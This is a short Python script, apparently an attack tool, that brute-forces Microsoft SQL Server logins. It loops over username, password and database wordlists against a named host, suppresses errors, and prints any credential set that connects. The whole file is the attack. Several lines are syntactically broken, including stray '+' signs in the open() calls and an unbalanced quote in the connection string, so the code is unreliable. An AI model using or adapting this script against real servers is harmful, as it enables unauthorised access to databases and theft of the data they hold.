import socket, argparse, pypyodbc

parser = argparse.ArgumentParser()
parser.add_argument("hostname",help="Example:hummingbirdscyberteam.com",action="store")
parser.add_argument("-u","--username",help="File path for usernames.Example:usernames.txt",action="store")
parser.add_argument("-p","--password",help="File path for passwords.Example:passwords.txt",action="store")
parser.add_argument("-d","--databases",help="File path for databses.Example:databases.txt",action="store")
args = parser.parse_args()

def Main():
    reading_f(args.username,args.password,args.databases,args.hostname)

def reading_f(usernamef,passwordf,databasef,hostf):
    a=[]
    b=[]
    c=[]
    with open (usernamef+,"r",encoding = "utf-8") as users:
        for i in users:
            a.append(i.strip())
    with open(passwordf+,"r",encoding = "utf-8") as pwd:
        for i in pwd:
            b.append(i.strip())
    with open (databasef+,"r",encoding = "utf-8") as db:
        for i in db:
            c.append(i.strip())
    
    for i in a:
        for j in b:
            for k in c:
                try:
                    connect(i, j, hostf, k)
                except:
                    pass

def connect(user, pwd, host, db):
    con = 'Driver={SQL Server Native Client 11.0};Server='+host+';Database='+db+';Uid='+user+';Pwd='+pwd+';''
    try:
        connection = pypyodbc.connect(con)
        if connection:
            print("--->Connected to MsSQL database, username:" + user + ", password:" + pwd +", host:"+ host +", database:"+db)
    except:
        pass
    
if __name__=="__main__":
    try:
        Main()
    except Exception as e:
        print(e)

